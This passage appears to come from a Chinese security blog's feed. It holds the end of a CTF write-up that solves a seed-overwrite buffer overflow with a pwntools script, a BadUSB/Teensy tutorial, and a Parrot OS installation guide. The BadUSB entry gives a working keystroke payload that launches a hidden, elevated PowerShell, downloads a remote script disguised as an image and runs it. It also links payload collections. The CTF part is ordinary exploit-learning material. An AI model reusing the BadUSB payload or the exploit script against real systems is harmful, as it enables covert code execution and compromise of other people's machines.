class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v12, <span class="string">"!"</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v13, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  LODWORD(v14) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">                   &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">                   <span class="string">"If you guess the next 100 random numbers I shall give you the flag!"</span>);</span><br><span class="line">  LODWORD(v15) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v14, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v15, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v34 = rand();</span><br><span class="line">    LODWORD(v16) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"What number am I thinking of? ["</span>);</span><br><span class="line">    LODWORD(v17) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v16, i);</span><br><span class="line">    LODWORD(v18) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v17, <span class="string">"/100]"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v18, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::getline&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v27);</span><br><span class="line">    v33 = sub_1928(&amp;v27, <span class="number">0L</span>L, <span class="number">10L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v33 != v34 )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v21) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Wow that is wrong!"</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v21, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      v22 = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">    LODWORD(v19) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Wow that is corect!"</span>);</span><br><span class="line">    LODWORD(v20) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v19, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v26);</span><br><span class="line">  <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::basic_ifstream(&amp;v25, <span class="string">"./flag"</span>, <span class="number">8L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::is_open(&amp;v25) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::getline&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v25, &amp;v26);</span><br><span class="line">    LODWORD(v23) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;v26);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v23, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::close(&amp;v25, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::~basic_ifstream(&amp;v25);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v26);</span><br><span class="line">LABEL_15:</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v27);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v29);</span><br><span class="line">  <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::~basic_ifstream(&amp;v30);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v22;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>它首先从<a href="https://www.cnblogs.com/Flychown/p/6868520.html" target="_blank" rel="noopener">/dev/urandom</a>读取种子值并生成随机数。它将此随机数存储在v35中。之后，它使用<code>std :: getline（std :: cin，＆v27）</code>读取用户输入。由于它是一个<code>std :: string</code>，它首先调用<code>c_str（）</code>函数来获取C字符串指针并将该指针存储在<code>v10</code>中。最后，它调用<code>strcpy（＆dest，v10）</code>将我们的字符串复制到<code>dest</code>。好处是在这些操作期间没有长度检查，这意味着我们可以使用缓冲区溢出覆盖其他变量。</p><p>让我们继续我们的分析。</p><p>在读取输入并将其复制到<code>dest</code>后， 它会调用<code>srand（v35）</code>。因此，第一个随机生成的数字实际上是进一步使用的种子值。最后，它使用<code>rand（）</code>生成100个随机数，并期望我们正确猜测它们。</p><p>我们可以看到，从<code>dest</code>到<code>v35</code>的距离是700字节，<strong>这意味着在700个字符之后，接下来的4个字符将覆盖作为种子的<code>v35</code>中的值。由于我们可以根据需要设置种子值，因此我们可以猜测将生成的数字。</strong><br>(我们输入的是dest将覆盖v35)</p><p>既然我们可以控制种子，我们来试试将种子设置为<code>AAAA</code>,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> seed = <span class="number">0x41414141</span>;#AAAA</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d "</span>, rand());</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知识点:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pwn</span><br><span class="line">&gt;&gt;&gt; pwn.p32(0x41414141)</span><br><span class="line">&apos;AAAA&apos;</span><br></pre></td></tr></table></figure></p><p>这样来输出一百个伪随机数字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2045728160,999757742,1103458615,457950600,1444241668,459281054,1543513065,1546750049,178068626,1337501091,1398490315,632882557,316733390,627129835,375653904,1151751726,132249441,1178832412,1784493309,36098333,1808153066,1840701539,495212499,111955712,1895620395,1941274903,495499453,177285689,7383240,596865193,1837829365,2053111400,1596622935,793804332,363578353,893380956,1253085387,1907091418,292647357,1431154013,1097108861,1691137672,2064036570,1413842252,170783860,292206826,418110330,303033301,1471039239,55119991,339131634,1131708657,1895821530,834344133,1243664369,1643958278,628135388,1739163822,1821243967,635518628,188545368,1511589684,541146381,1785168303,157910369,904724734,531065611,1410995756,664332504,823712968,694666121,1761441365,367366993,611219043,1027799969,538150853,903425870,1445910299,841184154,226981461,1501030291,1180315788,1358690118,1249368173,2014659921,454870840,745842803,495311661,46551014,419603122,1130830289,235096382,1931192807,1671976670,2020264686,2089103176,429217756,403846649,1352615284,1093550260</span><br></pre></td></tr></table></figure></p><p>wp.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">numbers = [<span class="number">2045728160</span>,<span class="number">999757742</span>,<span class="number">1103458615</span>,<span class="number">457950600</span>,<span class="number">1444241668</span>,<span class="number">459281054</span>,<span class="number">1543513065</span>,<span class="number">1546750049</span>,<span class="number">178068626</span>,<span class="number">1337501091</span>,<span class="number">1398490315</span>,<span class="number">632882557</span>,<span class="number">316733390</span>,<span class="number">627129835</span>,<span class="number">375653904</span>,<span class="number">1151751726</span>,<span class="number">132249441</span>,<span class="number">1178832412</span>,<span class="number">1784493309</span>,<span class="number">36098333</span>,<span class="number">1808153066</span>,<span class="number">1840701539</span>,<span class="number">495212499</span>,<span class="number">111955712</span>,<span class="number">1895620395</span>,<span class="number">1941274903</span>,<span class="number">495499453</span>,<span class="number">177285689</span>,<span class="number">7383240</span>,<span class="number">596865193</span>,<span class="number">1837829365</span>,<span class="number">2053111400</span>,<span class="number">1596622935</span>,<span class="number">793804332</span>,<span class="number">363578353</span>,<span class="number">893380956</span>,<span class="number">1253085387</span>,<span class="number">1907091418</span>,<span class="number">292647357</span>,<span class="number">1431154013</span>,<span class="number">1097108861</span>,<span class="number">1691137672</span>,<span class="number">2064036570</span>,<span class="number">1413842252</span>,<span class="number">170783860</span>,<span class="number">292206826</span>,<span class="number">418110330</span>,<span class="number">303033301</span>,<span class="number">1471039239</span>,<span class="number">55119991</span>,<span class="number">339131634</span>,<span class="number">1131708657</span>,<span class="number">1895821530</span>,<span class="number">834344133</span>,<span class="number">1243664369</span>,<span class="number">1643958278</span>,<span class="number">628135388</span>,<span class="number">1739163822</span>,<span class="number">1821243967</span>,<span class="number">635518628</span>,<span class="number">188545368</span>,<span class="number">1511589684</span>,<span class="number">541146381</span>,<span class="number">1785168303</span>,<span class="number">157910369</span>,<span class="number">904724734</span>,<span class="number">531065611</span>,<span class="number">1410995756</span>,<span class="number">664332504</span>,<span class="number">823712968</span>,<span class="number">694666121</span>,<span class="number">1761441365</span>,<span class="number">367366993</span>,<span class="number">611219043</span>,<span class="number">1027799969</span>,<span class="number">538150853</span>,<span class="number">903425870</span>,<span class="number">1445910299</span>,<span class="number">841184154</span>,<span class="number">226981461</span>,<span class="number">1501030291</span>,<span class="number">1180315788</span>,<span class="number">1358690118</span>,<span class="number">1249368173</span>,<span class="number">2014659921</span>,<span class="number">454870840</span>,<span class="number">745842803</span>,<span class="number">495311661</span>,<span class="number">46551014</span>,<span class="number">419603122</span>,<span class="number">1130830289</span>,<span class="number">235096382</span>,<span class="number">1931192807</span>,<span class="number">1671976670</span>,<span class="number">2020264686</span>,<span class="number">2089103176</span>,<span class="number">429217756</span>,<span class="number">403846649</span>,<span class="number">1352615284</span>,<span class="number">1093550260</span>]</span><br><span class="line"> <span class="comment">#刚才生成的数字</span></span><br><span class="line">r = remote(<span class="string">'167.99.143.206'</span>, <span class="number">65031</span>)</span><br><span class="line">r.recvlines(<span class="number">3</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span> * <span class="number">700</span> + p32(<span class="number">0x41414141</span>))<span class="comment">#保证和之前生成数字时的种子一致</span></span><br><span class="line">r.recvlines(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> numbers:</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(str(number))</span><br><span class="line">    r.recvlines(<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br></pre></td></tr></table></figure></p><p>这样我们及控制种子，１００个数字也输对了，flag就get到了<br><code>DCTF{8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa}</code><br>430111200008287946</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;XORnigma&quot;&gt;&lt;a href=&quot;#XORnigma&quot; class=&quot;headerlink&quot; title=&quot;XORnigma&quot;&gt;&lt;/a&gt;XORnigma&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>BadUSB初探</title>
    <link href="https://threst.github.io/2018/11/02/HID/"/>
    <id>https://threst.github.io/2018/11/02/HID/</id>
    <published>2018-11-02T05:32:13.000Z</published>
    <updated>2018-11-11T10:13:09.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Teensy-USB开发板"><a href="#Teensy-USB开发板" class="headerlink" title="Teensy USB开发板"></a>Teensy USB开发板</h2><p>Teensy是一个非常小的完整的基于USB接口的单片机开发系统，能够实现多种类型的项目。所有的编程是通过USB端口。在没有特殊的程序要求下，只有一个标准的Mini-B USB电缆和PC或Macintosh电脑的USB端口。</p><p>主要特点：</p><pre><code>可以是任何类型设备的USBAVR处理器，16 MHz单个按键编程易于使用的Teensy Loader应用程序免费软件开发工具兼容Mac OS X，Linux和Windows小尺寸,许多项目的完美支持使用标签面包板非常低的成本</code></pre><p>所需工具：</p><pre><code>1.Teensy ++ 2.0 2.Teensyduino插件v1.443.arduino v1.8.7</code></pre><p><a href="https://www.arduino.cc/en/Main/Software/" target="_blank" rel="noopener">arduino下载</a><br><a href="http://www.pjrc.com/teensy/td_download.html" target="_blank" rel="noopener">Teensyduino插件下载地址</a><br><a href="https://www.pjrc.com/teensy/loader.html" target="_blank" rel="noopener">Teensy Loader</a></p><p>1.Arduino软件不支持Teensy，因此您必须运行Teensyduino安装程序 才能将Teensy文件添加到Arduino软件中。</p><p>2.如果您使用的是Linux，则 必须将<a href="https://www.pjrc.com/teensy/49-teensy.rules" target="_blank" rel="noopener">49-teensy.rules</a>文件复制到<code>/etc/udev/rules.d/</code>，以便非root用户访问Teensy USB设备</p><p>3.板子正常编译的时候会弹出teensy的窗口，按下板子上面的按钮，等下teensy就会识别出插入的是什么型号的板子.只有识别出才可以上传代码。</p><p>注意:arduino选teensy++2.0板子，usb type 类型选第二个,要不提示Keyboard变量不存在</p><p><img src="https://i.loli.net/2018/10/27/5bd4309735e79.png" alt=""></p><h2 id="Kautilya安装"><a href="#Kautilya安装" class="headerlink" title="Kautilya安装"></a>Kautilya安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/samratashok/Kautilya &amp;&amp; cd Kautilya</span><br><span class="line">bundle install</span><br><span class="line">ruby kautilya.rb</span><br><span class="line"></span><br><span class="line">Updates:</span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><h2 id="keyboard语法"><a href="#keyboard语法" class="headerlink" title="keyboard语法"></a>keyboard语法</h2><p>盘功能使32u4或SAMD微型板能够通过微型原生USB端口向连接的计算机发送击键。注意：并非所有可能的ASCII字符，特别是非打印字符，都可以通过键盘库发送。</p><p><code>Keyboard.print()</code>和<code>Keyboard.println()</code>都是屏幕输出，后者换行输出<br><code>Keyboard.press()</code>功能就像按下键并按住键盘一样<br><code>Keyboard.release()</code>释放键盘,和press向对应<br><code>Keyboard.write()</code>向所连接的计算机发送击键。这类似于按下和释放键盘上的键。您可以发送一些ASCII字符或其他键盘修饰符和特殊键。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">按键  键码  按键  键码  按键  键码  按键  键码</span><br><span class="line">A     65    J   74    S   83    1   49</span><br><span class="line">B     66    K   75    T   84    2   50</span><br><span class="line">C     67    L   76    U   85    3   51</span><br><span class="line">D     68    M   77    V   86    4   52</span><br><span class="line">E     69    N   78    W   87    5   53</span><br><span class="line">F     70    O   79    X   88    6   54</span><br><span class="line">G     71    P   80    Y   89    7   55</span><br><span class="line">H     72    Q   81    Z   90    8   56</span><br><span class="line">I     73    R   82    0   48    9   57</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">按键  键码  按键  键码  按键  键码  按键  键码</span><br><span class="line">0     96    8   104   F1  112   F7  118</span><br><span class="line">1     97    9   105   F2  113   F8  119</span><br><span class="line">2     98    *   106   F3  114   F9  120</span><br><span class="line">3     99    +   107   F4  115   F10 121</span><br><span class="line">4     100 Enter 108   F5  116   F11 122</span><br><span class="line">5     101   -   109   F6  117   F12 123</span><br><span class="line">6     102   .   110              </span><br><span class="line">7     103   /   111</span><br><span class="line"></span><br><span class="line">按键        键码   按键       键码   按键        键码     按键  键码</span><br><span class="line">BackSpace   8     Esc       27    Right Arrow 39      -_  189</span><br><span class="line">Tab         9     Spacebar  32    Down Arrow  40      .&gt;  190</span><br><span class="line">Clear       12    Page Up   33    Insert      45      /?  191</span><br><span class="line">Enter       13    Page Down 34    Delete      46      `~  192</span><br><span class="line">Shift       16    End       35    Num Lock    144     [&#123;  219</span><br><span class="line">Control     17    Home      36    ;:          186     /|  220</span><br><span class="line">Alt         18    Left Arrow 37   =+          187     ]&#125;  221</span><br><span class="line">Cape Lock   20    Up A</span><br></pre></td></tr></table></figure><h2 id="payload编写"><a href="#payload编写" class="headerlink" title="payload编写"></a>payload编写</h2><p>全屏装逼<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Keyboard.println("START-PROCESS -fILEpATH POWERSHELL \" -NOP -W HIDDEN -C SET-eXECUTIONpOLICY rEMOTEsIGNED -FORCE;CD $ENV:PUBLIC;(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE(\'HTTP://image.3001.net/images/20160411/14603516445510.jpg\',\'C:\\USERS\\PUBLIC\\GET.PS1\');./GET.PS1;EXIT\" -vERB RUNAS;EXIT");</span><br></pre></td></tr></table></figure></p><p><code>START-PROCESS</code>你可以指定浏览器和带上URL参数</p><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p><a href="https://www.freebuf.com/sectool/150367.html" target="_blank" rel="noopener"> 实战Teensy烧录渗透测试U盘 </a><br><a href="https://www.freebuf.com/articles/system/96737.html" target="_blank" rel="noopener"> Teensy HID 攻击工具 Kautilya 的改进与稳定利用分析 </a><br><a href="https://astr0baby.wordpress.com/2011/01/30/teensy2-0-and-metasploit/" target="_blank" rel="noopener">Teensy ++ 2.0和Metasploit</a><br><a href="https://astr0baby.wordpress.com/2011/07/27/teensy2-metasploit-part-2/" target="_blank" rel="noopener">Teensy ++ 2.0 Metasploit第2部分</a><br><a href="https://astr0baby.wordpress.com/2011/07/28/teensy2-0-part-3/" target="_blank" rel="noopener">Teensy ++ 2.0 Metasploit第3部分</a><br><a href="http://www.cnblogs.com/hojun/p/6492064.html" target="_blank" rel="noopener">BadUSB —— Teensy++2.0</a><br><a href="https://www.freebuf.com/column/181090.html" target="_blank" rel="noopener">关于HID攻击介绍</a><br><a href="https://hatboy.github.io/2018/09/14/Teensy%E4%B9%8B%E7%AE%80%E5%8D%95%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99/" target="_blank" rel="noopener">Teensy之简单代码编写</a><br><a href="https://www.freebuf.com/sectool/107242.html" target="_blank" rel="noopener">利用Arduino快速制作Teensy BadUSB</a><br><a href="http://wiki.radiowar.org/%E4%BD%BF%E7%94%A8TeensyLoader" target="_blank" rel="noopener">使用TeensyLoader</a></p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><a href="https://github.com/samratashok/Kautilya" target="_blank" rel="noopener">Kautilya</a><br><a href="https://github.com/Screetsec/Brutal" target="_blank" rel="noopener">Brutal</a><br><a href="https://github.com/lr3800/teensy" target="_blank" rel="noopener">teensy</a><br><a href="https://github.com/Ozuru/Paensy/tree/master/Payloads" target="_blank" rel="noopener">https://github.com/Ozuru/Paensy/tree/master/Payloads</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Teensy-USB开发板&quot;&gt;&lt;a href=&quot;#Teensy-USB开发板&quot; class=&quot;headerlink&quot; title=&quot;Teensy USB开发板&quot;&gt;&lt;/a&gt;Teensy USB开发板&lt;/h2&gt;&lt;p&gt;Teensy是一个非常小的完整的基于USB接口的单片
      
    
    </summary>
    
    
      <category term="BadUSB" scheme="https://threst.github.io/tags/BadUSB/"/>
    
  </entry>
  
  <entry>
    <title>parrot安装</title>
    <link href="https://threst.github.io/2018/10/16/install/"/>
    <id>https://threst.github.io/2018/10/16/install/</id>
    <published>2018-10-16T05:32:13.000Z</published>
    <updated>2018-11-11T10:12:23.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载系统"><a href="#下载系统" class="headerlink" title="下载系统"></a>下载系统</h2><p>网站:<a href="https://www.parrotsec.org/download.php" target="_blank" rel="noopener">https://www.parrotsec.org/download.php</a></p><p>镜像制作:Etcher<br><a href="https://etcher.io/" target="_blank" rel="noopener">https://etcher.io/</a></p><p>支持3平台，很好用</p><h2 id="更新系统"><a href="#更新系统" class="headerlink" title="更新系统"></a>更新系统</h2><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p><code>sudo vim /etc/apt/sources.list.d/parrot.list</code><br>添加清华源<br><code>deb http://mirrors.tuna.tsinghua.edu.cn/parrot/ parrot main contrib non-free</code></p><p>更新</p><p><code>apt-get update</code><br><code>apt-get dist-upgrade</code></p><h2 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h2><h3 id="安装fcitx"><a href="#安装fcitx" class="headerlink" title="安装fcitx"></a>安装fcitx</h3><p><code>sudo apt-get install fcitx</code></p><h3 id="安装fcitx-libs-qt"><a href="#安装fcitx-libs-qt" class="headerlink" title="安装fcitx-libs-qt"></a>安装fcitx-libs-qt</h3><p><code>sudo apt-get install fcitx-libs-qt</code></p><h3 id="下载对应版本deb"><a href="#下载对应版本deb" class="headerlink" title="下载对应版本deb"></a>下载对应版本deb</h3><p>去搜狗输入法官网<a href="http://pinyin.sogou.com/linux/" target="_blank" rel="noopener">http://pinyin.sogou.com/linux/</a> 下载自己系统对应版本的输入法安装包。</p><p><code>sudo apt-get -f install</code></p><p><code>sudo dpkg -i sogoupinyin_2.2.0.0108_amd64.deb</code></p><p>然后在fictx配置中中设置搜狗为第二个，这样首先的输入为英语，重启电脑</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;下载系统&quot;&gt;&lt;a href=&quot;#下载系统&quot; class=&quot;headerlink&quot; title=&quot;下载系统&quot;&gt;&lt;/a&gt;下载系统&lt;/h2&gt;&lt;p&gt;网站:&lt;a href=&quot;https://www.parrotsec.org/download.php&quot; target=&quot;_b
      
    
    </summary>
    
    
      <category term="系统" scheme="https://threst.github.io/tags/%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战wp</title>
    <link href="https://threst.github.io/2018/10/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    <id>https://threst.github.io/2018/10/14/极客大挑战/</id>
    <published>2018-10-14T05:32:13.000Z</published>
    <updated>2018-11-11T10:10:57.639Z</updated>
    
